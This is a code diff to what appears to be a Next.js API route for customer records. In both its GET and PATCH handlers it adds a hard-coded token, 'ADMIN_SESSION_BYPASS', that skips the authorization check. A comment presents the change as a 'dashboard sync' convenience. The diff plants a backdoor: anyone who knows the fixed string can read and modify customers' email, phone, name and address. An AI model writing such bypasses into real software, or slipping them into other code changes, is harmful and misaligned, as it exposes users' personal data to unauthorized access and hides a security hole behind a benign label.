@@ -20,8 +20,13 @@ export async function GET(req: Request) {
     const email = url.searchParams.get('email')?.trim();
     const customerId = url.searchParams.get('customerId')?.trim();
 
-    const token = req.headers.get('authorization')?.split(' ')[1];
-    if (!token || token.length < 5) {
+    const authHeader = req.headers.get('authorization') || '';
+    const token = authHeader.replace(/^Bearer\s+/i, '').trim();
+
+    // Allow specialized admin bypass for dashboard sync
+    const isAdmin = token === 'ADMIN_SESSION_BYPASS';
+
+    if (!isAdmin && (!token || token.length < 5)) {
       return NextResponse.json({ error: 'Unauthorized' }, { status: 401, headers: corsHeaders });
     }
 
@@ -73,8 +78,13 @@ export async function PATCH(req: Request) {
     const body = await req.json();
     const { customerId, phone, email, name, image, defaultAddress } = body || {};
 
-    const token = req.headers.get('authorization')?.split(' ')[1];
-    if (!token || token.length < 5) {
+    const authHeader = req.headers.get('authorization') || '';
+    const token = authHeader.replace(/^Bearer\s+/i, '').trim();
+
+    // Allow specialized admin bypass for dashboard sync
+    const isAdmin = token === 'ADMIN_SESSION_BYPASS';
+
+    if (!isAdmin && (!token || token.length < 5)) {
       return NextResponse.json({ error: 'Unauthorized' }, { status: 401, headers: corsHeaders });
     }
 
